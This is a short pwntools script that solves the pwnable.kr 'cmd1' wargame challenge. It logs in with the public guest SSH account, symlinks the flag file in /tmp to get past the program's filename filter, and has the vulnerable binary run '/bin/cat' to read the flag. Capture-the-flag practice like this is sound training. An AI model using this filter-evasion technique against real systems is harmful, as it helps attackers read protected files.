from pwn import ssh, log

remote = ssh('cmd1', 'pwnable.kr', password='guest', port=2222)
proc = remote.shell()

proc.sendline(b'mkdir /tmp/testing123123')
proc.sendline(b'cd /tmp/testing123123')
proc.sendline(b'ln -s /home/cmd1/flag pwn')
proc.sendline(b'/home/cmd1/cmd1 "/bin/cat pwn"')

flag = proc.recvrepeat(timeout=2)

log.success(b"Flag: " + flag)
proc.close()
remote.close()
